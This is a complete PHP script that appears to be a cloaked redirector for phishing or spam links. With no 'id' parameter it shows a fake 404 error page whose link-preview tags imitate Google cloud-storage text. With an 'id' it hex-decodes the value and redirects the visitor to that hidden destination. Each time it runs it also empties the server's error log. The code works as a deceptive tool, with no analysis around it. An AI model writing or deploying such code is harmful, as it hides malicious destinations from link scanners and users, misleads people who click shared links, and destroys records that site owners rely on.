<?php
$clean = fopen('error_log', 'w');
fwrite($clean,'');
fclose($clean);

$coli = array('https://itunes.apple.com','http://www.youtube.com','http://soundcloud.com','http://spotify.com','http://www.joox.com');
$redir = $coli[rand(0,(count($coli)-1))];

if(empty($_GET['id']))
{
echo '<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<meta name="theme-color" content="#d6c9a5" />
<meta name="msapplication-navbutton-color" content="#d6c9a5" />
<meta name="msapplication-TileColor" content="#d6c9a5"/>
<meta name="apple-mobile-web-app-capable" content="yes" />
<meta name="apple-mobile-web-app-status-bar-style" content="#d6c9a5" />
<title>404 Not Found :(</title>
<meta property="og:description" content="Safely store and share your photos, videos, files and more in the cloud. Your first 15 GB of storage are free with a Google account." />
<meta property="og:site_name" content="404 Not Found :(" />
<meta name="twitter:card" content="summary" />
<meta name="twitter:description" content="Safely store and share your photos, videos, files and more in the cloud. Your first 15 GB of storage are free with a Google account." />
<meta name="twitter:title" content="FileSystem - Safely store and share your photos, videos, files and more in the cloud. Your first 15 GB of storage are free with a Google account." />
<link rel="icon" href="/favicon.ico" type="image/x-icon" />
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
<link href=\'https://fonts.googleapis.com/css?family=Ubuntu\' rel=\'stylesheet\'>
<link href=\'https://fonts.googleapis.com/css?family=Fredericka the Great\' rel=\'stylesheet\'>
<style type="text/css">
body{
    background-image: url(/background.jpg);
    background-size: cover;
    margin-top: 10%;
    color: #000;
    text-shadow: 0 0 6px #000;
  }
  a, a:visited {
    color: #FFF;
    text-shadow: 0 0 6px #e1a74e;
  }
  .link{
    text-decoration: none;
font-family: Ubuntu;
text-shadow: 0 0 6px #000;
      }
  .panel {
    background-color: #d6c9a585;
    color: #FFF;
    border: solid 1px #d6c9a585;
    padding: 4px;
    width: 60%;
    border-radius: 7px;

} 

.boton{
  background-color: #D4A54D85;
    border-color: transparent;
    color: #fff;
    border-radius: 5px;
    width: 50%;
    height: auto;
    margin: 25px 25px 25px 25px;
    text-align: center; 
    vertical-align: middle;
    line-height: 62px;
}
.boton.is-hovered, .boton:hover {
    background-color: #D4A54D;
    color: #FFF;
    border: solid 1px #FFF;
.   border-radius: 5px;
    width: 50%;
    height: auto;
    margin: 25px 25px 25px 25px;
    text-align: center; 
    vertical-align: middle;
    line-height: 62px;
}
</style>
</head>
<body>
<center>
<div class="panel">
<h2 style="font-size:70px;text-shadow: 0 0 6px #000;font-family: Fredericka the Great">404 NOT FOUND</h2>
<h2 style="font-family: Ubuntu">Error Database Not Connect With A System<br/>Please Comeback Later...</h2>
</div>
</center>
</body>
</html>';
}else{
$uri = isset($_GET['id']) ? $_GET['id']: null;
$url = hex2bin($uri);
header("Location:".$url);
}
?>
